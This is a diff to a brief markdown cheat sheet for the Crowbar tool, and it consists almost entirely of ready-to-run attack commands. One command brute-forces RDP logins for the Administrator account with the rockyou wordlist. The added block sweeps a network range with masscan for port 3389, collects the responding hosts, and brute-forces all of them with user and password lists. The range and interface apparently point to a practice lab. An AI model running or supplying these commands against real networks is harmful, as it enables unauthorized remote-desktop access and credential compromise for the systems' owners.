@@ -1,8 +1,16 @@
 # Crowbar Cheatsheet
+
 ```bash
 crowbar -b rdp -s $IP -n 1 -t 30 -q -u Administrator -C /usr/share/wordlists/rockyou.txt 
 ```
 
+
+With users.txt and passwords.txt, get all rdp hosts in a network range and brute force rdp with them.
+```bash
+sudo masscan -p3389 -oG rdp.log --rate 500 -e tun0 10.10.10.0/24
+cat rdp.log | grep Timestamp | awk '{print $4"/0"}' > public-rdp-hosts.txt
+crowbar -n 4 -t 10 -q -b rdp -U users.txt -C passwords.txt -S public-rdp-hosts.txt
+```
 
 ## Usage
 
